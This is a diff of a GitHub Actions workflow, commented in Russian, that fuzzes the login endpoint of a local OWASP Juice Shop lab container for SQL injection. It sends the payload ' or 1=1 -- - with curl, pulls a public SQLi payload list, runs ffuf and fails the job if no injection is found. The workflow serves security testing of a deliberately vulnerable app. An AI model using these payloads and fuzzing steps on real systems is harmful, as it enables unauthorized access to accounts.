@@ -8,7 +8,9 @@ on:
   workflow_dispatch:
 
 permissions:
-  contents: read
+  contents: write
+  pull-requests: write
+  security-events: write
   actions: read
 
 jobs:
@@ -22,45 +24,57 @@ jobs:
           - 3000:3000
 
     steps:
-      - name: Wait for Juice Shop
+      # 1. Ждём, пока Juice Shop поднимется, плюс явная демонстрация уязвимости curl'ом
+      - name: Wait for service and demo SQLi
         run: |
-          for i in {1..60}; do
+          # Ждём до 60 секунд, пока главная страница отдаёт 200/304
+          for i in {1..30}; do
             code=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000 || true)
             if [ "$code" = "200" ] || [ "$code" = "304" ]; then
               echo "Juice Shop is up"
-              exit 0
+              break
             fi
             sleep 2
           done
-          echo "Juice Shop did not start in time"
-          docker ps -a
-          exit 1
 
-      - name: Install Go
-        uses: actions/setup-go@v5
-        with:
-          go-version: 'stable'
+          echo "Demo SQLi with known payload:"
+          curl --path-as-is -i -s -k -X 'POST' \
+            -H 'Host: localhost:3000' \
+            -H 'Content-Type: application/json' \
+            --data-binary '{"email":"'\'' or 1=1 -- -","password":"pass"}' \
+            'http://localhost:3000/rest/user/login' \
+            > demo-sqli-response.txt || true
 
-      - name: Download SQLi payloads
+      # 2. Качаём payload'ы и чистим от комментариев/пустых строк
+      - name: Get payloads
         run: |
-          wget -O sqli.txt "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/SQL-Injection"
-          grep -vE '^\s*(#|$)' sqli.txt > sqli-clean.txt
-          wc -l sqli-clean.txt
+          wget -O SQL-Injection.txt "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/SQL-Injection"
+          grep -vE '^\s*(#|$)' SQL-Injection.txt > sqli-clean.txt
 
-      - name: Install ffuf
+          # Добавим заведомо рабочий payload в начало для проверки
+          printf "' or 1=1 -- -\n" | cat - sqli-clean.txt > sqli-with-known.txt
+          mv sqli-with-known.txt sqli-clean.txt
+
+      # 3. Ставим Go и ffuf
+      - name: Install fuzzing
         run: |
+          sudo apt-get update -y
+          sudo apt-get install -y jq
           go install github.com/ffuf/ffuf/v2@latest
-          $HOME/go/bin/ffuf -V
 
+      # 4. Базовый неуспешный логин для сравнения
       - name: Baseline failed login
         run: |
           curl -s -o baseline-response.json -w "%{http_code}" \
             -X POST "http://localhost:3000/rest/user/login" \
             -H "Content-Type: application/json" \
             --data '{"email":"normal@example.com","password":"wrongpass"}' \
-            > baseline-status.txt
+            > baseline-status.txt || true
+          echo "Baseline HTTP status:"
+          cat baseline-status.txt || true
 
-      - name: Run ffuf against login
+      # 5. Собственно фаззинг логина
+      - name: Run fuzzing for SQLi in login
         run: |
           $HOME/go/bin/ffuf \
             -w sqli-clean.txt:FUZZ \
@@ -69,31 +83,41 @@ jobs:
             -H "Content-Type: application/json" \
             -d '{"email":"FUZZ","password":"pass"}' \
             -mc 200 \
-            -fr '"authentication"' \
+            -mr '"umail"' \
             -of json \
             -o ffuf-results.json || true
 
-      - name: Show findings summary
-        run: |
-          echo "Baseline status:"
-          cat baseline-status.txt
-          echo
-          echo "Potential hits:"
-          grep -n '"FUZZ"' ffuf-results.json || true
-          grep -n '"url"' ffuf-results.json || true
-          grep -n '"status"' ffuf-results.json || true
+          echo "ffuf results count:"
+          jq '.results | length' ffuf-results.json || cat ffuf-results.json
 
-      - name: Get Juice Shop logs
+          echo "Potential payloads that worked:"
+          jq -r '.results[].input.FUZZ // empty' ffuf-results.json || true
+
+      # 6. Считаем обнаружение успешным/нет по ffuf-results.json
+      - name: Fail job if no SQLi found
+        run: |
+          hits=$(jq '.results | length' ffuf-results.json || echo 0)
+          echo "Hits: ${hits}"
+          if [ "$hits" -eq 0 ]; then
+            echo "No SQL injection payloads found by ffuf"
+            exit 1
+          else
+            echo "SQL injection detected by ffuf"
+          fi
+
+      # 7. Снимаем логи Juice Shop
+      - name: Get Logs from Service
         run: |
           docker logs $(docker ps -q --filter ancestor=bkimminich/juice-shop) > juice-logs.log || true
 
-      - name: Upload artifacts
+      # 8. Загружаем все артефакты
+      - name: Upload results
         uses: actions/upload-artifact@v4
         with:
           name: security-reports-bundle
           path: |
+            demo-sqli-response.txt
             baseline-status.txt
             baseline-response.json
             ffuf-results.json
             juice-logs.log
-          if-no-files-found: warn
